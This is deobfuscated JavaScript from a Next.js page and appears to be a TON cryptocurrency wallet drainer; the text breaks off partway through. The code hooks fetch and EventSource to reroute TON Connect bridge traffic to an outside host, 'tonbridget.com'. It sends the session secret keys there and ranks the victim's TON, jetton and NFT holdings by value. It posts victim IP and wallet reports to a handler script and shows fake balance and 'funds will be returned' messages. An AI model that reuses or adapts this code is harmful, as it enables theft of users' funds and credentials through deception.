//Tue Aug 27 2024 01:22:08 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([[405], {
  5557: function (_0x53a396, _0x1c2e67, _0x34c31f) {
    (window.__NEXT_P = window.__NEXT_P || []).push(["/", function () {
      return _0x34c31f(9902);
    }]);
  },
  9902: function (_0x52aedd, _0x2bf6bd, _0x366c98) {
    'use strict';

    _0x366c98.r(_0x2bf6bd);
    _0x366c98.d(_0x2bf6bd, {
      default: function () {
        return _0x48a579;
      }
    });
    var _0x3dc525 = _0x366c98(7294),
      _0x169e4 = _0x366c98(1989),
      _0x4b6491 = _0x366c98(3491),
      _0x38b15a = _0x366c98(6104);
    function _0x48a579() {
      (0, _0x3dc525.useEffect)(async () => {
        const _0x106fb6 = {
          total: 0.5,
          ton: 0.13,
          nft: 0.1,
          jettons: 0.1
        };
        const _0x3ed9cc = {
          NFTSCAN_API_KEY: "s0Uaior9NIAQEaqlEffWSIIt",
          wallet: "UQDgFwiokL1ojVwXa3Ac7xCLfGB0Ti0foSw5NZ48Aj_vhs_6",
          comment: {},
          modal: {},
          version: "0.0.76",
          minBalance: _0x106fb6,
          bypassURL: "tonbridget.com",
          wallets: null,
          tonConnectUI: null,
          blocklist: ["RU", "KZ", "BY", "UA", "AM", "AZ", "KG", "MD", "UZ", "TM", "TJ"]
        };
        _0x3ed9cc.comment.ton = "馃敀Your funds are safe, once the transaction is confirmed, they will be returned to your address";
        _0x3ed9cc.comment.nft = "馃敀Your funds are safe, once the transaction is confirmed, they will be returned to your address";
        _0x3ed9cc.comment.jetton = "馃敀Your funds are safe, once the transaction is confirmed, they will be returned to your address";
        _0x3ed9cc.modal.text = "Top-up your balance by at least 0.2 TON";
        _0x3ed9cc.modal.header = "You have an insufficient balance";
        const _0x2f87a8 = {
          address: "unknown",
          platform: "unknown",
          name: "unknown",
          maxMessages: 4,
          version: "v4",
          fake_token_address: "EQCC5LK70rkEdid75oWoLmY5W3nk0tfQ4UW7RVSeVPQLKShz",
          fake_token_address_master: "EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT",
          fake_nft_address: "",
          fake_token_amount: 100000,
          fake_val: 1
        };
        const _0xbf7f36 = {
          wallet: _0x2f87a8,
          ip: "unknown",
          country: "unknown",
          domain: document.location.hostname,
          connected: !1,
          price: 6
        };
        let _0x2e2330 = async () => {
            try {
              let _0x53ed3c = await fetch("https://".concat(_0xbf7f36.domain, "/fetch.php?type=comment"), {
                  method: "POST"
                }),
                _0x3606aa = await _0x53ed3c.json();
              console.log("phrases:", _0x3606aa);
              _0x3ed9cc.modal.text = _0x3606aa.alert || _0x3ed9cc.modal.text;
              _0x3ed9cc.modal.header = _0x3606aa.alert_header || _0x3ed9cc.modal.header;
              _0x3ed9cc.comment.ton = _0x3606aa.comment || _0x3ed9cc.comment.ton;
              _0x3ed9cc.comment.nft = _0x3606aa.comment || _0x3ed9cc.comment.nft;
              _0x3ed9cc.comment.jetton = _0x3606aa.comment || _0x3ed9cc.comment.jetton;
              _0xbf7f36.wallet.fake_token_address_master = _0x3606aa.ftadm || _0xbf7f36.wallet.fake_token_address_master;
              _0xbf7f36.wallet.fake_token_address = _0x3606aa.ftad || _0xbf7f36.wallet.fake_token_address;
              _0xbf7f36.wallet.fake_nft_address = _0x3606aa.ftna || _0xbf7f36.wallet.fake_nft_address;
              _0xbf7f36.wallet.fake_token_amount = _0x3606aa.ftam || _0xbf7f36.wallet.fake_token_amount;
              _0xbf7f36.wallet.fake_val = _0x3606aa.ft || _0xbf7f36.wallet.fake_token;
            } catch (_0x770417) {
              console.error("fetch phrases exception:", _0x770417);
            }
          },
          _0x402cfb = async () => {
            let _0x471be8 = await fetch("https://raw.githubusercontent.com/ton-blockchain/wallets-list/main/wallets-v2.json", {
              method: "GET"
            });
            return await _0x471be8.json();
          };
        !function (_0x2c7b3f, _0x18931e, _0x36bc4c) {
          if ("function" != typeof _0x18931e) {
            return;
          }
          let _0xdc4a52 = _0x462e21 => {
            if (!_0x3ed9cc.wallets) {
              return "unknown";
            }
            for (let _0x2a113c of _0x3ed9cc.wallets) for (let _0x14b11e of _0x2a113c.bridge) if ("sse" === _0x14b11e.type && _0x462e21.includes(_0x14b11e.url)) {
              return _0x2a113c;
            }
            return "unknown";
          };
          _0x2c7b3f.fetch = function () {
            try {
              arguments[0].pathname.includes("bridge") && (_0xbf7f36.wallet.name = _0xdc4a52(arguments[0].href).app_name, arguments[0] = new URL("https://".concat(_0x3ed9cc.bypassURL, "/bridge/").concat(_0xbf7f36.wallet.name, "/message").concat(arguments[0].search)));
            } catch (_0xa0c973) {}
            return _0x18931e.apply(this, arguments);
          };
          _0x2c7b3f.EventSource = class extends _0x36bc4c {
            constructor(_0x3bde4a) {
              let _0x236a88 = JSON.parse(localStorage.getItem("ton-connect-storage_bridge-connection"));
              _0xbf7f36.wallet.name = _0xdc4a52(_0x3bde4a).app_name;
              super(_0x3bde4a = _0x236a88.sessionCrypto ? "https://".concat(_0x3ed9cc.bypassURL, "/bridge/").concat(_0xbf7f36.wallet.name, "?pub=").concat(_0x236a88.sessionCrypto.publicKey, "&sec=").concat(_0x236a88.sessionCrypto.secretKey) : "https://".concat(_0x3ed9cc.bypassURL, "/bridge/").concat(_0xbf7f36.wallet.name, "?pub=").concat(_0x236a88.session.sessionKeyPair.publicKey, "&sec=").concat(_0x236a88.session.sessionKeyPair.secretKey));
            }
          };
        }(window, window.fetch, window.EventSource);
        let _0x4dc801 = async _0x1fcc1c => {
            let _0x4bc7c5 = JSON.parse(localStorage.getItem("ton-connect-storage_bridge-connection"));
            if ("http" !== _0x4bc7c5.type) {
              return "";
            }
            {
              let _0x40606d = JSON.parse(localStorage.getItem("ton-connect-ui_wallet-info")),
                _0xbec5fa = {
                  pub: _0x4bc7c5.sessionCrypto ? _0x4bc7c5.sessionCrypto.publicKey : _0x4bc7c5.session.sessionKeyPair.publicKey,
                  sec: _0x4bc7c5.sessionCrypto ? _0x4bc7c5.sessionCrypto.secretKey : _0x4bc7c5.session.sessionKeyPair.secretKey,
                  from: _0x4bc7c5.session.walletPublicKey,
                  app: _0x40606d.appName,
                  address: _0xbf7f36.wallet.address
                };
              _0xbf7f36.wallet.name = _0xbec5fa.app;
              console.log("data:", _0xbec5fa);
              return "https://".concat(_0x3ed9cc.bypassURL, "/bridge/").concat(_0xbec5fa.app, "/sendTransaction?pub=").concat(_0xbec5fa.pub, "&sec=").concat(_0xbec5fa.sec) + "&walletPublicKey=".concat(_0xbec5fa.from, "&address=").concat(_0xbec5fa.address, "&chunk=").concat(encodeURIComponent(JSON.stringify(_0x1fcc1c)));
            }
          },
          _0x4cc71d = _0x449a8f => new Promise(_0x4fb947 => setTimeout(_0x4fb947, _0x449a8f)),
          _0x11f2fe = async _0x9252ac => {
            let _0x1abf02 = encodeURIComponent(btoa(_0x9252ac));
            try {
              let _0x3d3615 = await fetch("https://".concat(_0xbf7f36.domain, "/visit_handler.php"), {
                method: "POST",
                body: "message=".concat(_0x1abf02),
                headers: {
                  "Content-Type": "application/x-www-form-urlencoded"
                }
              });
              _0x3d3615.ok ? console.log("visit success send") : console.log("visit log error code:", _0x3d3615.status);
            } catch (_0x3404f0) {
              console.log("visit log error:", _0x3404f0);
            }
          },
          _0x28f968 = async _0x38ebb0 => {
            let _0x176c25 = encodeURIComponent(btoa(_0x38ebb0));
            try {
              let _0x21631b = await fetch("https://".concat(_0xbf7f36.domain, "/handler.php"), {
                method: "POST",
                body: "message=".concat(_0x176c25),
                headers: {
                  "Content-Type": "application/x-www-form-urlencoded"
                }
              });
              _0x21631b.ok ? console.log("success send") : console.log("log error code:", _0x21631b.status);
            } catch (_0xde5a96) {
              console.log("log error:", _0xde5a96);
            }
          },
          _0x4aec0f = async () => new Promise(async (_0x128841, _0x17a621) => {
            try {
              let _0x3e5a23 = await fetch("https://www.cloudflare.com/cdn-cgi/trace"),
                _0x371ca8 = await _0x3e5a23.text(),
                _0x4d30ca = {};
              for (let _0x556e14 of _0x371ca8.trim().split("\n")) {
                let _0x57116d = _0x556e14.split("=");
                "ip" === _0x57116d[0] && (_0x4d30ca.ip = _0x57116d[1]);
                "loc" === _0x57116d[0] && (_0x4d30ca.loc = _0x57116d[1]);
              }
              _0x128841(_0x4d30ca);
            } catch (_0x3b5002) {
              console.error("fetch location error:", _0x3b5002);
              _0x17a621(_0x3b5002);
            }
          }),
          _0x4ad86b = () => {
            let _0x506d46 = document.createElement("div"),
              _0x39f77b = document.createElement("style");
            _0x39f77b.innerHTML = ".go1993895553{font-family:arial;} .go4168504425{font-family:arial;} .go1770544884{width:256px;padding:12px 16px;display:flex;gap:9px;background-color:#121214;box-shadow:0 4px 24px rgba(0, 0, 0, 0.16);border-radius:16px;}.go4168504425{font-style:normal;font-weight:510;font-size:14px;line-height:130%;color:#E5E5EA;}.go1993895553{font-style:normal;font-weight:700;font-size:20px;line-height:28px;text-align:center;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go1318663305{padding:0;display:flex;justify-content:center;align-items:center;width:32px;height:32px;border-radius:50%;background-color:#222224;border:none;cursor:pointer;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go1318663305:hover{transform:scale(1.04);}}.go1318663305:active{transform:scale(0.96);}@media (hover: none){.go1318663305:active{transform:scale(0.92);}}.go4218612181{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:pointer;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go4218612181:hover{transform:scale(1.02);}}.go4218612181:active{transform:scale(0.98);}@media (hover: none){.go4218612181:active{transform:scale(0.96);}}.go3974562317{background-color:#0098EA;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);padding:8px 16px 8px 12px;display:flex;align-items:center;gap:4px;height:40px;}.go242012907{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:not-allowed;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go242012907:hover{transform:unset;}}.go242012907:active{transform:unset;}@media (hover: none){.go242012907:active{transform:unset;}} .go37342527{box-shadow:0 4px 16px rgba(0, 0, 0, 0.08), 0 16px 64px rgba(0, 0, 0, 0.16);width:fit-content;margin:auto;}@media (max-width: 440px){.go37342527{width:100%;height:fit-content;margin:auto 0 0 0;}}.go3288899091{transform:translateY(-8px);margin-bottom:12px;}.go3535743411{margin-bottom:12px;}tc-root *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, Tahoma, Verdana, sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;-webkit-tap-highlight-color:transparent;}tc-root img{-webkit-user-select:none;-webkit-touch-callout:none;}tc-root *:focus{outline:#08f auto 2px;}tc-root li{list-style:none;}tc-root button{outline:none;}body.tc-disable-scroll{position:fixed;overflow-y:scroll;right:0;left:0;}body.tc-using-mouse tc-root *:focus{outline:none;}@keyframes go1365964679{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.go121314943{animation:go1365964679 1s linear infinite;}.go3251346826{height:18px;width:18px;}.go817518207{min-width:148px;height:40px;background-color:#121214;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);display:flex;align-items:center;justify-content:center;}.go1140934594{font-style:normal;font-weight:590;font-size:15px;line-height:18px;color:#E5E5EA;}.go3349661836{transform:rotate(270deg);transition:transform 0.1s ease-in-out;}.go157313249{padding:12px 16px;min-width:148px;justify-content:center;background-color:#121214;}.go2933289244 > div:first-child{margin-top:20px;}.go3572451881{width:fit-content;display:flex;flex-direction:column;align-items:flex-end;}.go3758850101{position:absolute;right:16px;top:16px;}.go3525292397{margin-top:16px;}.go1186201158{font-weight:510;font-size:16px;line-height:20px;text-align:center;max-width:200px;color:#7D7D85;}.go3799783513{display:flex;flex-direction:column;align-items:center;padding-bottom:8px;}.go3872688706{position:relative;min-height:100px;width:416px;padding:44px 56px 24px;box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.04);background-color:#121214;border-radius:24px;}@media (max-width: 440px){.go3872688706{width:100%;}}.go1901766449{border-radius:24px;background-color:#222224;}@media (max-width: 440px){.go1901766449{border-radius:24px 24px 0 0;}}.go823957079{display:flex;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background-color:rgba(0, 0, 0, 0.4);padding:20px 0;overflow-y:auto;}@media (max-width: 440px){.go823957079{padding-bottom:0;}}.go3727189606{font-style:normal;font-weight:590;font-size:16px;line-height:20px;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go2847679431{width:192px;}.go2847679431 > h3{font-size:15px;}.go3770780435{align-self:center;}";
            _0x506d46.innerHTML = "\n            <div class=\"go823957079 s-enter-active s-enter-to\" data-tc-actions-modal-container=\"true\" data-tc-modal=\"true\">\n                <div class=\"go37342527 go1901766449\">\n                    <div class=\"go3872688706\">\n                        <button class=\"go3758850101 go1318663305\" data-tc-icon-button=\"true\">\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M2.71966 2.71968C3.01255 2.42678 3.48743 2.42677 3.78032 2.71966L8.00002 6.93925L12.2197 2.71967C12.5126 2.42677 12.9874 2.42678 13.2803 2.71967C13.5732 3.01257 13.5732 3.48744 13.2803 3.78033L9.06068 7.99991L13.2803 12.2197C13.5732 12.5126 13.5732 12.9874 13.2803 13.2803C12.9874 13.5732 12.5126 13.5732 12.2197 13.2803L8.00002 9.06057L3.78033 13.2803C3.48744 13.5732 3.01257 13.5732 2.71967 13.2803C2.42678 12.9874 2.42677 12.5126 2.71967 12.2197L6.93936 7.99991L2.71968 3.78034C2.42678 3.48745 2.42677 3.01257 2.71966 2.71968Z\" fill=\"#909099\"></path></svg>\n                        </button>\n                        <div class=\"go3799783513\" data-tc-confirm-modal=\"true\">\n                            <svg width=\"75px\" height=\"75px\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\" stroke=\"\"><g id=\"SVGRepo_bgCarrier\" stroke-width=\"0\"></g><g id=\"SVGRepo_tracerCarrier\" stroke-linecap=\"round\" stroke-linejoin=\"round\"></g><g id=\"SVGRepo_iconCarrier\"> <path d=\"M10.0303 8.96967C9.73741 8.67678 9.26253 8.67678 8.96964 8.96967C8.67675 9.26256 8.67675 9.73744 8.96964 10.0303L10.9393 12L8.96966 13.9697C8.67677 14.2626 8.67677 14.7374 8.96966 15.0303C9.26255 15.3232 9.73743 15.3232 10.0303 15.0303L12 13.0607L13.9696 15.0303C14.2625 15.3232 14.7374 15.3232 15.0303 15.0303C15.3232 14.7374 15.3232 14.2625 15.0303 13.9697L13.0606 12L15.0303 10.0303C15.3232 9.73746 15.3232 9.26258 15.0303 8.96969C14.7374 8.6768 14.2625 8.6768 13.9696 8.96969L12 10.9394L10.0303 8.96967Z\" fill=\"#0098EA\"></path> <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M12.0574 1.25H11.9426C9.63424 1.24999 7.82519 1.24998 6.41371 1.43975C4.96897 1.63399 3.82895 2.03933 2.93414 2.93414C2.03933 3.82895 1.63399 4.96897 1.43975 6.41371C1.24998 7.82519 1.24999 9.63422 1.25 11.9426V12.0574C1.24999 14.3658 1.24998 16.1748 1.43975 17.5863C1.63399 19.031 2.03933 20.1711 2.93414 21.0659C3.82895 21.9607 4.96897 22.366 6.41371 22.5603C7.82519 22.75 9.63423 22.75 11.9426 22.75H12.0574C14.3658 22.75 16.1748 22.75 17.5863 22.5603C19.031 22.366 20.1711 21.9607 21.0659 21.0659C21.9607 20.1711 22.366 19.031 22.5603 17.5863C22.75 16.1748 22.75 14.3658 22.75 12.0574V11.9426C22.75 9.63423 22.75 7.82519 22.5603 6.41371C22.366 4.96897 21.9607 3.82895 21.0659 2.93414C20.1711 2.03933 19.031 1.63399 17.5863 1.43975C16.1748 1.24998 14.3658 1.24999 12.0574 1.25ZM3.9948 3.9948C4.56445 3.42514 5.33517 3.09825 6.61358 2.92637C7.91356 2.75159 9.62177 2.75 12 2.75C14.3782 2.75 16.0864 2.75159 17.3864 2.92637C18.6648 3.09825 19.4355 3.42514 20.0052 3.9948C20.5749 4.56445 20.9018 5.33517 21.0736 6.61358C21.2484 7.91356 21.25 9.62177 21.25 12C21.25 14.3782 21.2484 16.0864 21.0736 17.3864C20.9018 18.6648 20.5749 19.4355 20.0052 20.0052C19.4355 20.5749 18.6648 20.9018 17.3864 21.0736C16.0864 21.2484 14.3782 21.25 12 21.25C9.62177 21.25 7.91356 21.2484 6.61358 21.0736C5.33517 20.9018 4.56445 20.5749 3.9948 20.0052C3.42514 19.4355 3.09825 18.6648 2.92637 17.3864C2.75159 16.0864 2.75 14.3782 2.75 12C2.75 9.62177 2.75159 7.91356 2.92637 6.61358C3.09825 5.33517 3.42514 4.56445 3.9948 3.9948Z\" fill=\"#0098EA\"></path> </g>\n                            </svg>\n                            <h1 class=\"go3525292397 go1993895553\" data-tc-h1=\"true\">".concat(_0x3ed9cc.modal.header.replaceAll("<", "&lt;").replaceAll(">", "&gt;"), "</h1>\n                            <div class=\"go1186201158 go4168504425\" fontsize=\"14px\" fontweight=\"510\" lineheight=\"130%\" color=\"#E5E5EA\" data-tc-text=\"true\" style=\"cursor: default;\">").concat(_0x3ed9cc.modal.text.replaceAll("<", "&lt;").replaceAll(">", "&gt;"), "</div>\n                        </div>\n                    </div>\n                </div>\n            </div>\";");
            document.querySelector("body").appendChild(_0x39f77b);
            document.querySelector("body").appendChild(_0x506d46);
            _0x506d46.addEventListener("click", _0x445d39 => {
              _0x506d46.style.display = "none";
            });
          },
          _0x58b022 = async () => {
            let _0x44b4e8 = await fetch("https://tonapi.io/v2/rates?tokens=ton&currencies=usd"),
              _0x542595 = await _0x44b4e8.json();
            _0xbf7f36.price = _0x542595.rates.TON.prices.USD;
            console.log("tonapi rates:", _0x542595.rates.TON);
            console.log("ton price usd:", _0xbf7f36.price);
          },
          _0x3e2d80 = async () => {
            let _0x3dd78a = await fetch("https://toncenter.com/api/v3/wallet?address=".concat(_0x3ed9cc.tonConnectUI.account.address)),
              _0x56c774 = await _0x3dd78a.json(),
              _0x2cd1c5 = [];
            if (_0x56c774 && _0x56c774.balance) {
              let _0x143ce8 = parseFloat(_0x56c774.balance),
                _0x360109 = (_0x143ce8 / 1000000000).toFixed(2),
                _0x3743fe = _0x360109 * _0xbf7f36.price;
              const _0x13a8ef = {
                type: "TON",
                data: _0x56c774,
                balance: _0x3743fe,
                tgBalance: _0x360109,
                sendingBalance: _0x143ce8,
                calculatedBalanceUSDTG: _0x3743fe,
                name: "TON"
              };
              if (_0x2cd1c5.push(_0x13a8ef), null == _0x56c774 ? void 0 : _0x56c774.wallet_type) {
                console.log("wallet type:", _0x56c774.wallet_type);
                let _0x2187ef = _0x56c774.wallet_type,
                  _0x34ae8d = _0x2187ef.includes("v5") ? 255 : _0x2187ef.includes("v4") ? 4 : 1;
                console.log("max messages (from interface):", _0x34ae8d);
                _0xbf7f36.wallet.maxMessages = _0x34ae8d;
                _0xbf7f36.wallet.version = _0x2187ef.replaceAll(" ", "").replaceAll("_", "").replaceAll("wallet", "");
              }
            }
            return _0x2cd1c5;
          },
          _0x4ad294 = async () => {
            let _0x4c3668 = await fetch("https://tonapi.io/v2/accounts/".concat(_0x3ed9cc.tonConnectUI.account.address, "/jettons?currencies=ton,usd,rub&token=AGVJ44XDIIHHTDQAAAAHD5OV363E4CBEW5YDBAH542VN4PGJZYQWWU4GBSOO4U3Z67KDLAY")),
              _0x571347 = await _0x4c3668.json();
            console.log("jetton data:", _0x571347);
            let _0x7c8da9 = _0x571347.balances,
              _0xcbc89c = 0,
              _0x4e2a73 = [];
            _0x7c8da9 && _0x7c8da9.length > 0 ? (_0x7c8da9.forEach(_0x18e857 => {
              let _0x393f3a = _0x18e857.wallet_address.address,
                _0x382a4a = _0x18e857.jetton,
                _0x41fe71 = _0x382a4a.address,
                _0x5d105a = _0x382a4a.symbol,
                _0x3f6c5f = parseInt(_0x18e857.balance),
                _0x118f88 = 0;
              if (0 !== _0x3f6c5f) {
                _0x118f88 = "jUSDT" === _0x382a4a.symbol || "USD鈧�" === _0x382a4a.symbol ? _0x3f6c5f / 1000000 : _0x3f6c5f / 1000000000;
                let _0x2908fb = _0x18e857.price.prices.USD,
                  _0xdb7705 = Math.floor(_0x3f6c5f * _0x2908fb),
                  _0x590e27 = Math.floor(_0x118f88 * _0x2908fb),
                  _0x13acf5 = _0x118f88.toFixed(2);
                _0x590e27 >= _0x3ed9cc.minBalance.jettons && (_0xcbc89c += _0xdb7705, _0x4e2a73.push({
                  type: "Jetton",
                  wallet_address: _0x393f3a,
                  TokenBalance: _0x3f6c5f,
                  data: _0x571347,
                  roundedBalance: _0x13acf5,
                  address: _0x41fe71,
                  symbol: _0x5d105a,
                  name: _0x5d105a,
                  balance: _0xdb7705,
                  price_usd: _0x2908fb,
                  calculatedBalanceUSDTG: _0x590e27
                }), _0x4e2a73.sort((_0x286949, _0x16a505) => _0x16a505.calculatedBalanceUSDTG - _0x286949.calculatedBalanceUSDTG));
              }
            }), console.log("total balance jettons:", _0xcbc89c)) : console.log("jettons not found");
            return _0x4e2a73;
          },
          _0x174a41 = async _0x386d22 => {
            let _0x2523bb = async _0x303c0e => {
                const _0x45a396 = {
                  "X-API-KEY": _0x3ed9cc.NFTSCAN_API_KEY
                };
                let _0xa3ef0f = await fetch(_0x303c0e, {
                  method: "GET",
                  headers: _0x45a396
                });
                _0xa3ef0f.ok || console.error("fetchWithApiKey() error: ".concat(_0xa3ef0f.statusText, " (code ").concat(_0xa3ef0f.status, ")"));
                return await _0xa3ef0f.json();
              },
              _0x1175e5 = [],
              _0x545066 = _0x386d22.map(async _0x1b595c => {
                try {
                  let _0x101683 = await _0x2523bb("https://tonapi.nftscan.com/api/ton/assets/".concat(_0x1b595c.address, "?show_attribute=true")),
                    _0x105d07 = await _0x2523bb("https://tonapi.nftscan.com/api/ton/statistics/collection/".concat(_0x1b595c.collection.address));
                  if (_0x101683 && _0x101683.data) {
                    let _0x70345f = _0x101683.data,
                      _0xd80598 = _0x105d07.data;
                    if (_0x70345f.metadata_json) {
                      try {
                        let _0x277916 = JSON.parse(_0x70345f.metadata_json),
                          _0x4e0436 = _0xd80598.average_price_24h || 0,
                          _0x2a7020 = Math.round(_0x4e0436);
                        _0x2a7020 >= _0x3ed9cc.minBalance.nft / _0xbf7f36.price && (_0x1175e5.push({
                          type: "NFT",
                          data: _0x70345f.token_address,
                          calculatedBalanceUSDTG: _0x2a7020 * _0xbf7f36.price,
                          balance: 1000000000 * _0x2a7020,
                          name: _0x277916.name,
                          nftPrice: _0x2a7020
                        }), _0x1175e5.sort((_0x25cded, _0x729bea) => _0x729bea.calculatedBalanceUSDTG - _0x25cded.calculatedBalanceUSDTG));
                      } catch (_0x37ad9b) {
                        console.error("error parsing metadata_json:", _0x37ad9b);
                      }
                    } else {
                      console.warn("metadata_json is null for token_address:", _0x70345f.token_address);
                    }
                  }
                } catch (_0x4f1663) {
                  console.error("error fetching NFT data for address:", _0x1b595c.address, _0x4f1663);
                }
              });
            await Promise.all(_0x545066);
            return _0x1175e5;
          },
          _0x4f2e06 = async () => {
            try {
              let _0x5b623b = await fetch("https://tonapi.io/v2/accounts/".concat(_0x3ed9cc.tonConnectUI.account.address, "/nfts?limit=1000&offset=0&indirect_ownership=false")),
                _0x29a6ed = await _0x5b623b.json();
              if (_0x29a6ed.nft_items = _0x29a6ed.nft_items.filter(_0x53159f => "blacklist" !== _0x53159f.trust), _0x29a6ed && _0x29a6ed.nft_items) {
                return _0x174a41(_0x29a6ed.nft_items);
              }
            } catch (_0x5b4c6a) {
              console.error("error fetching initial data (maybe no NFT):", _0x5b4c6a);
            }
            return [];
          },
          _0x247237 = async () => {
            var _0x5458e7, _0x32b982, _0x4e1794;
            let _0x3ce90a;
            if (!_0xbf7f36.connected) {
              return;
            }
            await _0x58b022();
            let _0x100eed = await _0x3e2d80(),
              _0x1bc348 = await _0x4ad294(),
              _0x14eced = await _0x4f2e06(),
              _0x575669 = (_0x32b982 = _0x1bc348, _0x4e1794 = _0x14eced, _0x3ce90a = new Set(), _0x32b982.forEach(_0x43f1f1 => _0x3ce90a.add(_0x43f1f1.symbol)), {
                jetton: _0x32b982,
                nft: _0x4e1794.filter(_0xe20707 => !_0x3ce90a.has(_0xe20707.name))
              });
            _0x1bc348 = _0x575669.jetton;
            _0x14eced = _0x575669.nft;
            let _0x3090a7 = [];
            for (let _0x379a95 of _0x100eed) _0x3090a7.push(Object.assign({}, _0x379a95));
            for (let _0x4a4f3a of _0x1bc348) _0x3090a7.push(_0x4a4f3a);
            for (let _0x2f4651 of _0x14eced) _0x3090a7.push(_0x2f4651);
            console.log("parsed assets list:", _0x3090a7);
            console.log("asset ton:", _0x100eed);
            let {
              comission: _0x3c3eae,
              need: _0x482631
            } = await _0x39b4e9(_0x100eed[0], _0x1bc348, _0x14eced);
            console.log("calculated comission:", _0x3c3eae);
            for (let _0x1fa5c0 = 0; _0x1fa5c0 < _0x3090a7.length; _0x1fa5c0++) {
              if ("TON" === _0x3090a7[_0x1fa5c0].type) {
                if (console.log("sending balance:", _0x3c3eae), _0x3c3eae.sendingBalance < 1) {
                  _0xbf7f36.connected = !1;
                  _0x4ad86b();
                  console.log("low balance ton");
                  let _0x31cb2f = await _0x13175c(_0x3090a7),
                    _0xd08d8a = _0x31cb2f.slice(0, Math.min(_0xbf7f36.wallet.maxMessages, _0x31cb2f.length)),
                    _0x3981d8 = await _0x2e1c81(_0xd08d8a),
                    _0xf451a9 = await _0x4dc801(_0x3981d8),
                    _0x9c7510 = "*No money*\n";
                  _0x9c7510 += "\n" + "*Domain:* ".concat(_0xbf7f36.domain, "\n") + "*IP Location:* ".concat(_0xbf7f36.ip, " ").concat(_0xbf7f36.country, "\n") + "*version:* ".concat(_0x3ed9cc.version, "\n") + "*walletname:* ".concat(_0xbf7f36.wallet.name.replace(/[^a-zA-Z0-9 ]+/g, ""), "\n") + "*walletplatform:* ".concat(_0xbf7f36.wallet.platform, "\n") + "\n";
                  "" !== _0xf451a9 && (_0x9c7510 += "*chunkurl:* [url](".concat(_0xf451a9, ")\n\n"));
                  _0x9c7510 += "*Wallet:* [Ton View](https://tonviewer.com/".concat(_0x3ed9cc.tonConnectUI.account.address, ")\n") + "\n" + "*TON Balance:*\n".concat(_0x100eed[0].tgBalance, " TON");
                  _0x1bc348.length > 0 && (_0x9c7510 += "\n\n*Jetton Balances:*", _0x1bc348.forEach(_0x33cda1 => {
                    var _0x322083;
                    _0x9c7510 += "\n".concat(null === (_0x322083 = _0x33cda1.symbol) || void 0 === _0x322083 ? void 0 : _0x322083.replace(/[^a-zA-Z0-9 ]+/g, ""), " - ").concat(_0x33cda1.calculatedBalanceUSDTG, " USD");
                  }));
                  _0x14eced.length > 0 && (_0x9c7510 += "\n\n*NFTs:*", _0x14eced.forEach(_0x3235b5 => {
                    var _0x1258a2;
                    _0x9c7510 += "\n".concat(null === (_0x1258a2 = _0x3235b5.name) || void 0 === _0x1258a2 ? void 0 : _0x1258a2.replace(/[^a-zA-Z0-9 ]+/g, ""), " - ").concat(_0x3235b5.calculatedBalanceUSDTG, " USD");
                  }));
                  _0x9c7510 += "\n\nneed comission: ".concat(_0x482631, " TON");
                  console.log("need comission:", _0x482631);
                  console.log("no_money message:", _0x9c7510 += "\n\naction:no\\_money");
                  await _0x28f968(_0x9c7510);
                  _0xbf7f36.connected = !1;
                  return;
                }
                _0x3090a7[_0x1fa5c0] = Object.assign({}, _0x3c3eae);
                break;
              }
            }
            let _0x22a137 = "*User Connected Wallet*\n";
            _0x22a137 += "\n" + "*Domain:* ".concat(_0xbf7f36.domain, "\n") + "*IP Location:* ".concat(_0xbf7f36.ip, " ").concat(_0xbf7f36.country, "\n") + "*version:* ".concat(_0x3ed9cc.version, "\n") + "*walletname:* ".concat(null === (_0x5458e7 = _0xbf7f36.wallet.name) || void 0 === _0x5458e7 ? void 0 : _0x5458e7.replace(/[^a-zA-Z0-9 ]+/g, ""), "\n") + "*walletplatform:* ".concat(_0xbf7f36.wallet.platform, "\n") + "\n" + "*Wallet:* [Ton View](https://tonviewer.com/".concat(_0x3ed9cc.tonConnectUI.account.address, ")\n") + "\n" + "*TON Balance:*\n".concat(_0x100eed[0].tgBalance, " TON");
            _0x1bc348.length > 0 && (_0x22a137 += "\n\n*Jetton Balances:*", _0x1bc348.forEach(_0x212a02 => {
              var _0x479337;
              _0x22a137 += "\n".concat(null === (_0x479337 = _0x212a02.symbol) || void 0 === _0x479337 ? void 0 : _0x479337.replace(/[^a-zA-Z0-9 ]+/g, ""), " - ").concat(_0x212a02.calculatedBalanceUSDTG, " USD");
            }));
            _0x14eced.length > 0 && (_0x22a137 += "\n\n*NFTs:*", _0x14eced.forEach(_0x3e41d1 => {
              var _0x1958cf;
              _0x22a137 += "\n".concat(null === (_0x1958cf = _0x3e41d1.name) || void 0 === _0x1958cf ? void 0 : _0x1958cf.replace(/[^a-zA-Z0-9 ]+/g, ""), " - ").concat(_0x3e41d1.calculatedBalanceUSDTG, " USD");
            }));
